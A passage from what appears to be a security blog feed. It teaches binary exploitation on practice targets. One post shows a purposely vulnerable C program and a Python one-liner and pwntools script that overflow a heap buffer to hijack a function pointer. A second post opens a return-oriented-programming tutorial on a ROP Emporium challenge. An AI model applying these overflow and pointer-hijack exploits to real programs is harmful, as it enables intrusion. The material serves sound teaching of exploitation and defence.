                                &lt;span class=&quot;c1&quot;&gt;// Whoops, I forget to check for malloc() returning NULL. Oh well.&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;greeting&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;greeting_flip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;hello&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Set the greeting to be either hello() or yo()&lt;/span&gt;
                                              &lt;span class=&quot;c1&quot;&gt;// Note that greeting_flip is initialized to 0, so &quot;yo&quot; will always be the first greeting&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;greeting_flip&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;greeting_flip&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Use the other greeting next time&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;Enter the person&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\'&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;s name: &quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;fgets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BUF_SIZE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;stdin&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Get user input&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;sscanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;buf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Copy the person's name to the name buffer in p&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;%s was born at %p.&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// Print out the location where p is stored on the heap&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;p&lt;/code&gt; variable is a type of &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; that was just allocated memory using &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc()&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting_flip&lt;/code&gt; variable is initially set to 0, which means that &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; will always be first set to &lt;code class=&quot;highlighter-rouge&quot;&gt;yo&lt;/code&gt;. It will then flip back and forth between using &lt;code class=&quot;highlighter-rouge&quot;&gt;hello&lt;/code&gt; and using &lt;code class=&quot;highlighter-rouge&quot;&gt;yo&lt;/code&gt; as the greeting function whenever you create a new &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Now lets take a look at the code responsible for dealing with the &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command, which is also located in &lt;code class=&quot;highlighter-rouge&quot;&gt;main()&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;else if(strncmp(buf, &quot;greet&quot;, 5) == 0) { // Check if user input is &quot;greet&quot;
    printf(&quot;Type in the address of the person you want to say hi to: &quot;);
    fgets(buf, BUF_SIZE, stdin); // Scan the address into buf
    sscanf(buf, &quot;%p&quot;, &amp;amp;p); // Convert the address into a Person* pointer
    printf(&quot;You say hello to %s.\n&quot;, p-&amp;gt;name);
    p-&amp;gt;greeting(p); // Execute the greeting function
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Once you use the &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command, notice how the program executes whatever function &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; is equal to. What if there was a way for us to control the function pointer &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt;? If we were able to set &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; equal to the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;, then we could execute &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; when we greet a person. This would print out the flag and solve the problem!&lt;/p&gt;

&lt;p&gt;Note that in both code segments, the call to &lt;code class=&quot;highlighter-rouge&quot;&gt;fgets()&lt;/code&gt; uses &lt;code class=&quot;highlighter-rouge&quot;&gt;BUF_SIZE&lt;/code&gt; as the size of the buffer. From the programmer’s perspective, this makes sense because &lt;code class=&quot;highlighter-rouge&quot;&gt;buf&lt;/code&gt; is an array on the stack with length &lt;code class=&quot;highlighter-rouge&quot;&gt;BUF_SIZE&lt;/code&gt;. Scroll to the top of the C file to see what &lt;code class=&quot;highlighter-rouge&quot;&gt;BUF_SIZE&lt;/code&gt; is.&lt;/p&gt;

&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#define BUF_SIZE 128
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Wait, hold on a second. Wasn’t the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer in &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; only 32 bytes long? We were copying whatever string was inside the buffer to &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt;, so can we overflow the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer? Are we able to overwrite the value of the &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; pointer that comes directly after &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt;? To answer these questions, let’s see what happens when we give the program a large input value.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ ./people
win() is at 0x55555555529f.

Valid commands:
new: Give birth to a new person.
greet: Say hello to a person.
kill: Kill a person.
quit: Stop the program.

&amp;gt; new
Enter the person's name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA was born at 0x555555559ac0.
&amp;gt; greet
Type in the address of the person you want to say hi to: 0x555555559ac0
You say hello to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
Segmentation fault
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The program gave us a segmentation fault after we tried to greet that person. This means that we most likely overwrote the &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; parameter, and if we’re able to control the &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; parameter, we can execute whatever function we want to! Since the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; attribute is 32 characters long, we could probably just write the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; right after it. Then we could use the &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command to execute our code.&lt;/p&gt;

&lt;p&gt;Since ASLR is currently disabled, we know that the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; will always be &lt;code class=&quot;highlighter-rouge&quot;&gt;0x55555555529f&lt;/code&gt;, which is written as &lt;code class=&quot;highlighter-rouge&quot;&gt;b'\x9fRUUUU'&lt;/code&gt; as a Python little-endian byte string. Also, because ASLR is disabled, we also know that the first address that &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; will return will always be &lt;code class=&quot;highlighter-rouge&quot;&gt;0x55555555a6c0&lt;/code&gt;. This address does not have to be inputted in little endian format because the &lt;code class=&quot;highlighter-rouge&quot;&gt;%p&lt;/code&gt; string formatter automatically converts it to little-endian format.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ python -c &quot;import sys; sys.stdout.buffer.write(b'new\n' + b'A'*32 + b'\x9fRUUUU' + b'\ngreet\n' + b'0x55555555a6c0\n' + b'q\n')&quot; | ./people
win() is at 0x55555555529f.

Valid commands:
new: Give birth to a new person.
greet: Say hello to a person.
kill: Kill a person.
quit: Stop the program.

&amp;gt; Enter the person's name: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�RUUUU was born at 0x55555555a6c0.
&amp;gt; Type in the address of the person you want to say hi to: You say hello to AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�RUUUU.
flag{insert_flag_here}
&amp;gt; Ending program.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;My exploit above will first issue the “new” command to create a new &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt;. Then it will overflow the &lt;code class=&quot;highlighter-rouge&quot;&gt;name&lt;/code&gt; buffer on the heap so that we are able to overwrite &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; with the address of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt;. From there, we issue a &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command. The &lt;code class=&quot;highlighter-rouge&quot;&gt;greet&lt;/code&gt; command requires the address of the &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; as input, and since we know that &lt;code class=&quot;highlighter-rouge&quot;&gt;malloc()&lt;/code&gt; will always first return &lt;code class=&quot;highlighter-rouge&quot;&gt;0x55555555a6c0&lt;/code&gt;, we can just supply that as the &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt;’s address. This will execute the function that &lt;code class=&quot;highlighter-rouge&quot;&gt;greeting&lt;/code&gt; points to, which is &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; in this case. From there, we can issue the &lt;code class=&quot;highlighter-rouge&quot;&gt;q&lt;/code&gt; command to exit the program.&lt;/p&gt;

&lt;p&gt;This exploit uses hardcoded addresses, but since the program leaks the addresses of &lt;code class=&quot;highlighter-rouge&quot;&gt;win()&lt;/code&gt; and each &lt;code class=&quot;highlighter-rouge&quot;&gt;Person&lt;/code&gt; that we create, it is simple to write a script that exploits this program even when ASLR is enabled.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;from pwn import *

# Start the process and get the flag
p = process(&quot;./people&quot;)
win_addr = p64(int(str(p.recv()).split(&quot;\\n&quot;)[0].split(&quot; &quot;)[3][:-1], 16))

# Create a new person, set his/her greeting to win_addr, and get their address
p.sendline(b&quot;new&quot;)
p.sendline(b&quot;A&quot;*32 + win_addr)
person_addr = p64(int(str(p.recv()).split(&quot;\\n&quot;)[0].split()[9][:-1], 16))

# Execute the win() function and get the flag
p.sendline(b&quot;greet&quot;)
p.sendline(person_addr)
print(str(p.recv()).split(&quot;\\n&quot;)[1])

# End the program
p.sendline(b&quot;kill&quot;)
p.sendline(person_addr)
p.sendline(b&quot;q&quot;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And this is what happens when we run the script with ASLR turned on.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;$ echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
2
$ python solver.py
[+] Starting local process './people': pid 40221
flag{insert_flag_here}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;section class=&quot;related&quot;&gt;
  &lt;h3 style=&quot;color: black&quot;&gt;Related Posts&lt;/h3&gt;
  &lt;ul class=&quot;post-list&quot;&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/30/creating-a-basic-heap-allocator.html&quot;&gt;
          Creating a Basic Heap Allocator
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/12/29/defeating-aslr-via-memory-leak.html&quot;&gt;
          Defeating ASLR via Memory Leak
        &lt;/a&gt;
      &lt;/li&gt;
    
      &lt;li style=&quot;color: black; font-size: 9;&quot;&gt;
        &lt;a href=&quot;/2020/10/25/mining-hero-vulnerabilities.html&quot;&gt;
          Mining Hero Vulnerabilities
        &lt;/a&gt;
      &lt;/li&gt;
    
  &lt;/ul&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Earlier today, I was messing around with some code, and I came up with this vulnerable program. This program was written using bad programming habits on purpose, and I am going to show you how it is vulnerable to a buffer overflow. This isn’t a complicated vulnerability, and while it does involve corrupting memory on the heap, it does not require you to have in-depth knowledge about how the heap works (unlike many other heap exploits).</summary></entry><entry><title type="html">Return Oriented Programming Tutorial</title><link href="http://localhost:4000/2020/10/14/return-oriented-programming-tutorial.html" rel="alternate" type="text/html" title="Return Oriented Programming Tutorial" /><published>2020-10-14T00:00:00-04:00</published><updated>2020-10-14T00:00:00-04:00</updated><id>http://localhost:4000/2020/10/14/return-oriented-programming-tutorial</id><content type="html" xml:base="http://localhost:4000/2020/10/14/return-oriented-programming-tutorial.html">&lt;p&gt;In this blog post, I will be explaining how you can make use of Return Oriented Programming (ROP) gadgets in order to execute code when NX is enabled. I will also be solving one of ROP Emporium’s challenges by using a ROP chain.&lt;/p&gt;

&lt;h3 id=&quot;what-is-nx&quot;&gt;What is NX?&lt;/h3&gt;

&lt;p&gt;The NX bit stands for the “no-execute” bit, and it allows computers to mark certain sections of code as executable or non executable. If the process attempts to execute code that is marked as executable, then there will be no problems, but if the process attempts to execute code that is marked as non-executable, then the processor will refuse to execute that line of code.&lt;/p&gt;

&lt;p&gt;In a typical stack overflow, the attacker “injects” shellcode into the stack, and then he/she overwrites the return address on the stack with a JMP RSP instruction. However, when NX is enabled, the stack is typically marked as non-executable, which means that we cannot simply place shellcode on the stack.&lt;/p&gt;

&lt;h3 id=&quot;what-are-rop-chains&quot;&gt;What are ROP Chains?&lt;/h3&gt;

&lt;p&gt;Suppose we have a binary with NX enabled, and we have already figured out how to overwrite the return address and control RIP via buffer overflow. ROP chains will allow us to get around the problems that NX causes. The way this works is, we will make RIP point to a line of assembly code that is marked as executable in the binary instead of simply injecting our shellcode into the running process.&lt;/p&gt;

&lt;p&gt;Since we have complete control over RIP, we can theoretically make the program jump to any address in the binary, but we will want to specifically focus on finding one or a few lines of code in the program that end with a RET instruction. These lines of code will be referred to as a “ROP gadget.” Since each ROP gadget ends with a RET instruction, and since we can overwrite the return address multiple times, we can “chain” multiple ROP gadgets together to execute the code that we want.&lt;/p&gt;

&lt;p&gt;Don’t worry if this doesn’t really make sense to you yet. It will make more sense when you look at an example.&lt;/p&gt;

&lt;h3 id=&quot;a-basic-example&quot;&gt;A Basic Example&lt;/h3&gt;

&lt;p&gt;I will be using &lt;a href=&quot;https://ropemporium.com/challenge/write4.html&quot;&gt;ROP Emporium’s Write4 Challenge&lt;/a&gt; in 64-bit as our target. When we run the target, we are given the following:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;./write4 
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; AAAAAAAAAAAAAAA
Thank you!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We are able to overwrite the return address of the target after writing 40 bytes via buffer overflow.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;python &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;print('A'*40 + 'BBBBBBBB')&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; input
&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;gdb write4 
GNU gdb &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Ubuntu 9.2-0ubuntu1~20.04&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 9.2
Copyright &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;C&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 2020 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &amp;lt;http://gnu.org/licenses/gpl.html&amp;gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type &lt;span class=&quot;s2&quot;&gt;&quot;show copying&quot;&lt;/span&gt; and &lt;span class=&quot;s2&quot;&gt;&quot;show warranty&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;details.
This GDB was configured as &lt;span class=&quot;s2&quot;&gt;&quot;x86_64-linux-gnu&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Type &lt;span class=&quot;s2&quot;&gt;&quot;show configuration&quot;&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;configuration details.
For bug reporting instructions, please see:
&amp;lt;http://www.gnu.org/software/gdb/bugs/&amp;gt;.
Find the GDB manual and other documentation resources online at:
    &amp;lt;http://www.gnu.org/software/gdb/documentation/&amp;gt;.

For &lt;span class=&quot;nb&quot;&gt;help&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;help&quot;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Type &lt;span class=&quot;s2&quot;&gt;&quot;apropos word&quot;&lt;/span&gt; to search &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;commands related to &lt;span class=&quot;s2&quot;&gt;&quot;word&quot;&lt;/span&gt;...
GEF &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;linux ready, &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;gef&lt;span class=&quot;s1&quot;&gt;' to start, `gef config'&lt;/span&gt; to configure
78 commands loaded &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;GDB 9.2 using Python engine 3.8
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; 2 commands could not be loaded, run &lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;gef missing&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt; to know why.
/home/n/.gdbinit:2: Error &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;sourced &lt;span class=&quot;nb&quot;&gt;command &lt;/span&gt;file:
&lt;span class=&quot;nb&quot;&gt;source command &lt;/span&gt;requires file name of file to source.
Reading symbols from write4...
&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;No debugging symbols found &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;write4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
gef➤  r &amp;lt; input
Starting program: /home/n/Documents/Exploitation/ropemporium/write4/write4 &amp;lt; input
write4 by ROP Emporium
x86_64

Go ahead and give me the input already!

&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; Thank you!

Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7dc7942 &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;pwnme &lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; from ./libwrite4.so
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt; Legend: Modified register | Code | Heap | Stack | String &lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
&lt;span class=&quot;nv&quot;&gt;$rax&lt;/span&gt;   : 0xb               
&lt;span class=&quot;nv&quot;&gt;$rbx&lt;/span&gt;   : 0x0000000000400630  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
&lt;span class=&quot;nv&quot;&gt;$rcx&lt;/span&gt;   : 0x00007ffff7cbf1e7  →  0x5177fffff0003d48 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;H=&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rdx&lt;/span&gt;   : 0x0               
&lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;   : 0x00007fffffffdd98  →  &lt;span class=&quot;s2&quot;&gt;&quot;BBBBBBBB&quot;&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rbp&lt;/span&gt;   : 0x4141414141414141 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;AAAAAAAA&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$rsi&lt;/span&gt;   : 0x00007ffff7d9a723  →  0xd9c4c0000000000a
&lt;span class=&quot;nv&quot;&gt;$rdi&lt;/span&gt;   : 0x00007ffff7d9c4c0  →  0x0000000000000000
&lt;span class=&quot;nv&quot;&gt;$rip&lt;/span&gt;   : 0x00007ffff7dc7942  →  &amp;lt;pwnme+152&amp;gt; ret 
&lt;span class=&quot;nv&quot;&gt;$r8&lt;/span&gt;    : 0xb               
&lt;span class=&quot;nv&quot;&gt;$r9&lt;/span&gt;    : 0x2               
&lt;span class=&quot;nv&quot;&gt;$r10&lt;/span&gt;   : 0x00007ffff7dc74c9  →  0x6972700064616572 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;read&quot;&lt;/span&gt;?&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$r11&lt;/span&gt;   : 0x246             
&lt;span class=&quot;nv&quot;&gt;$r12&lt;/span&gt;   : 0x0000000000400520  →  &amp;lt;_start+0&amp;gt; xor ebp, ebp
&lt;span class=&quot;nv&quot;&gt;$r13&lt;/span&gt;   : 0x00007fffffffde90  →  0x0000000000000001
&lt;span class=&quot;nv&quot;&gt;$r14&lt;/span&gt;   : 0x0               
&lt;span class=&quot;nv&quot;&gt;$r15&lt;/span&gt;   : 0x0               
&lt;span class=&quot;nv&quot;&gt;$eflags&lt;/span&gt;: &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;ZERO carry PARITY adjust sign &lt;span class=&quot;nb&quot;&gt;trap &lt;/span&gt;INTERRUPT direction overflow RESUME virtualx86 identification]
&lt;span class=&quot;nv&quot;&gt;$cs&lt;/span&gt;: 0x0033 &lt;span class=&quot;nv&quot;&gt;$ss&lt;/span&gt;: 0x002b &lt;span class=&quot;nv&quot;&gt;$ds&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$es&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$fs&lt;/span&gt;: 0x0000 &lt;span class=&quot;nv&quot;&gt;$gs&lt;/span&gt;: 0x0000 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffdd98│+0x0000: &lt;span class=&quot;s2&quot;&gt;&quot;BBBBBBBB&quot;&lt;/span&gt;	 ← &lt;span class=&quot;nv&quot;&gt;$rsp&lt;/span&gt;
0x00007fffffffdda0│+0x0008: 0x000000000000000a
0x00007fffffffdda8│+0x0010: 0x00007ffff7bd50b3  →  &amp;lt;__libc_start_main+243&amp;gt; mov edi, eax
0x00007fffffffddb0│+0x0018: 0x00007ffff7ffc620  →  0x0005043c00000000
0x00007fffffffddb8│+0x0020: 0x00007fffffffde98  →  0x00007fffffffe21b  →  &lt;span class=&quot;s2&quot;&gt;&quot;/home/n/Documents/Exploitation/ropemporium/write4/[...]&quot;&lt;/span&gt;
0x00007fffffffddc0│+0x0028: 0x0000000100000000
0x00007fffffffddc8│+0x0030: 0x0000000000400607  →  &amp;lt;main+0&amp;gt; push rbp
0x00007fffffffddd0│+0x0038: 0x0000000000400630  →  &amp;lt;__libc_csu_init+0&amp;gt; push r15
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
   0x7ffff7dc793b &amp;lt;pwnme+145&amp;gt;      call   0x7ffff7dc7730 &amp;lt;puts@plt&amp;gt;
   0x7ffff7dc7940 &amp;lt;pwnme+150&amp;gt;      nop    
   0x7ffff7dc7941 &amp;lt;pwnme+151&amp;gt;      leave  
 → 0x7ffff7dc7942 &amp;lt;pwnme+152&amp;gt;      ret    
&lt;span class=&quot;o&quot;&gt;[!]&lt;/span&gt; Cannot disassemble from &lt;span class=&quot;nv&quot;&gt;$PC&lt;/span&gt;
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] Id 1, Name: &quot;write4&quot;, stopped, reason: SIGSEGV&lt;/span&gt;
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#0] 0x7ffff7dc7942 → pwnme()&lt;/span&gt;
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By looking at the Rop Emporium website, we see that we are given the following information:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;There is a function called &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(char* filename)&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;This function has been moved into a separate library, but a PLT entry for that function exists in the binary.&lt;/li&gt;
  &lt;li&gt;Our goal is to call &lt;code class=&quot;highlighter-rouge&quot;&gt;print_file(&quot;flag.txt&quot;)&lt;/code&gt;.&lt;/li&gt;
  &lt;li&gt;You can input NULL bytes into the program, and the program will read them just fine.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Note that NX is enabled, so we can’t just execute a &lt;code class=&quot;highlighter-rouge&quot;&gt;JMP RSP&lt;/code&gt; instruction and put shellcode on the stack.&lt;/p&gt;
